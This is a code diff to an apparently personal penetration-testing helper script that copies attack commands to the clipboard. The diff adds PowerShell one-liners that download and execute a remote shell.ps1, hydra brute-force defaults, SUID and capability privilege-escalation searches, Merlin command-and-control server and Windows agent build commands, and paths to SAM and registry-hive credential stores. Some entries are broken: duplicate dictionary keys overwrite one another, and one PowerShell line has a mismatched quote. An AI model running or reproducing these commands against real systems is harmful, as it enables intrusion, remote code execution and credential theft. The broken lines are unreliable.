@@ -20,6 +20,7 @@ target_ip = args.target
 store_directory = args.d
 
 """
+netstat -alnp
 Eliminate the / at the end of directory
 """
 if store_directory[-1] == "/":
@@ -105,14 +106,20 @@ def hydra():
     print("Please enter the path to the login form")
     path = get_url()
 
-    print("Please enter request from burp. Leave blank to use default")
+    print("Please enter request from burp.")
     request = get_url()
+    if request[-1] != "/":
+        request = "/" + request
 
     print("Please enter user list location")
     user_list = input("Input: ").strip()
+    if user_list == "":
+        user_list = "/mnt/hgfs/Pentest/password_cracking/top_usernames.txt"
 
     print("Please enter password list location")
     pass_list = input("Input: ").strip()
+    if pass_list == "":
+        pass_list = "/mnt/hgfs/Pentest/password_cracking/darkweb2017-top10000.txt"
 
     print("Please error message. Leave blank to use default")
     error = input("Input: ").strip()
@@ -161,8 +168,8 @@ def unicorn():
     if url == "":
         url = target_ip
 
-    options = {1 : ["TCP scan", f"unicornscan -pa {url} | tee {store_directory}/{url}_unicorn_tcp.txt"],
-        2 : ["UDP scan", f"unicornscan -pa -mU {url} | tee {store_directory}/{url}_udp_ports.txt"],
+    options = {1 : ["TCP scan", f"unicornscan -pa -r50 -mT {url} | tee {store_directory}/{url}_unicorn_tcp.txt"],
+        2 : ["UDP scan", f"unicornscan -pa -r50 -mU {url} | tee {store_directory}/{url}_udp_ports.txt"],
     }
     
     copy_to_clipboard(options)
@@ -219,6 +226,7 @@ def nc():
                 7 : ["Transfer file with nc at source", f"nc -w 3 [destination] {target_port}< out.file"],
                 8 : ["Transfer compressed file with nc at destination", f"nc -l -p {target_port} | uncompress -c | tar xvfp -"],
                 9 : ["Transfer compressed file with nc at source", f"tar cfp - /some/dir | compress -c | nc -w 3 [destination] {target_port}"],
+                10 : ["Port scan with nc", f"nc -vz {target_ip} 1-1023"],
             }
             break
     
@@ -249,6 +257,8 @@ def smbclient():
 def cewl():
     print("Please enter the url. Leave blank to use default")
     url = get_url()
+    if url == "":
+        url = target_ip
 
     options = {1 : ["Get all words on a page", f"cewl {url} -w {store_directory}/{target_ip}_cewl.txt"],
     }
@@ -359,7 +369,10 @@ def powershell():
     options = {1 : ["Download and execute powershell script in cmd", f"powershell IEX(New-Object Net.WebClient).downloadString('http://{source_ip}/shell.ps1')"],
         2 : ["Forcing powershell version 2", f"powershell -version 2 IEX(New-Object Net.WebClient).downloadString('http://{source_ip}/shell.ps1')"],
         3 : ["Download and execute powershell script", f"IEX(New-Object Net.WebClient).downloadString('http://{source_ip}/shell.ps1')"],
-        4 : ["Execute powershell script", f"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File shell.ps1"],
+        4 : ["Download and execute powershell script 2", f"IEX(IWR('http://{target_ip}/shell.ps1))"],
+        5 : ["Execute powershell script", f"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File shell.ps1"],
+        6 : ["Download file with powershell step 1", f"$WebClient = New-Object System.Net.WebClient"],
+        7 : ["Download file with powershell step 2", f"""$WebClient.DownloadFile("https://{source_ip}/file","C:\path\file")"""],
     }
     
     copy_to_clipboard(options)
@@ -421,6 +434,23 @@ def impacket():
     
     copy_to_clipboard(options)
 
+def find():
+    options = {1 : ["Find capable files", f"""find / -type f -print0 2>/dev/null | xargs -0 getcap 2>/dev/null"""],
+        2 : ["Find suid files 1", f"""find / -perm -u=s -type f 2>/dev/null"""],
+        3 : ["Find suid files 2", r"""find / –user root –perm –4000 –exec ls –ldb {};2>/dev/null"""],
+        4 : ["Find writable files", f"""find / -perm -2 ! -type l -ls 2>/dev/null"""],
+    }
+    
+    copy_to_clipboard(options)
+
+def merlin():
+    options = {1 : ["Generate certificate for 7 days (in /merlin/data/x509)", r"""openssl req -x509 -newkey rsa:4096 -sha256 -nodes -keyout server.key -out server.crt -subj "/CN=eramvn.rocks" -days 7"""],
+        2 : ["Start merlin server (in /merlin)", f'go run cmd/merlinserver/main.go -i {source_ip}'],
+        3 : ["Generate merlin agent for windows (in /merlin/cmd/merlinagent)", f'GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://{source_ip}:{local_port}" -o agent.exe main.go'],
+    }
+    
+    copy_to_clipboard(options)
+
 def linux():
     options = {1 : ["Service", f"/etc/init.d"],
         2 : ["Network configuration", "/etc/network/interfaces"],
@@ -437,17 +467,21 @@ def linux():
 
 def windows():
     options = {1 : ["Service", f"/etc/init.d"],
-        2 : ["Windows version", f"c:\WINDOWS\system32\eula.txt"],
+        2 : ["Windows version", f"%WinDir%\system32\eula.txt"],
         3 : ["Boot.ini", r"""c:\boot.ini"""],
-        4 : ["win.ini #1", "c:\WINDOWS\win.ini"],
-        5 : ["win.ini #2", "c:\WINNT\win.ini"],
-        6 : ["SAM backup", "c:\WINDOWS\Repair\SAM"],
-        7 : ["php.ini #1", "c:\WINDOWS\php.ini"],
-        8 : ["php.ini #2", "c:\WINNT\php.ini"],
-        9 : ["php.ini #3", r"""c:\home\bin\stable\apache\php.ini"""],
-        10 : ["httpd.conf #1", """c:\Program Files\Apache Group\Apache\conf\httpd.conf"""],
-        11 : ["httpd.conf #2", """c:\Program Files\Apache Group\Apache2\conf\httpd.conf"""],
-        12 : ["httpd.conf #3", r"""c:\Program Files\xampp\apache\conf\httpd.conf"""],
+        4 : ["win.ini #1", "%WinDir%\win.ini"],
+        5 : ["win.ini #2", "%WinDir%\win.ini"],
+        6 : ["SAM backup", "%WinDir%\Repair\SAM"],
+        7 : ["Backup Hives Location on Vista, Win7, Win8, Win10, Serv2008, Serv2012 and Serv2016", "%WinDir%\System32\Config\Regback"],
+        6 : ["NTUSER.dat on WinXP", "C:\Documents and Settings\<username"],
+        6 : ["NTUSER.dat, SOFTWARE, SYSTEM on Win7-Win10", "%UserProfile%"],
+        6 : ["USRCLASS.dat on Win7-Win10", "%UserProfile%\AppData\Local\Microsoft\Windows"],
+        8 : ["php.ini #1", "%WinDir%\php.ini"],
+        9 : ["php.ini #2", "%WinDir%\php.ini"],
+        10 : ["php.ini #3", r"""c:\home\bin\stable\apache\php.ini"""],
+        11 : ["httpd.conf #1", """c:\Program Files\Apache Group\Apache\conf\httpd.conf"""],
+        12 : ["httpd.conf #2", """c:\Program Files\Apache Group\Apache2\conf\httpd.conf"""],
+        13 : ["httpd.conf #3", r"""c:\Program Files\xampp\apache\conf\httpd.conf"""],
     }
     
     copy_to_clipboard(options)
@@ -506,6 +540,8 @@ options = {"nmap" : nmap,
            "wfuzz" : wfuzz,
            "runas" : runas,
            "impacket" : impacket,
+           "find" : find,
+           "merlin" : merlin,
 }
 
 systems = {"windows" : windows, "linux" : linux}
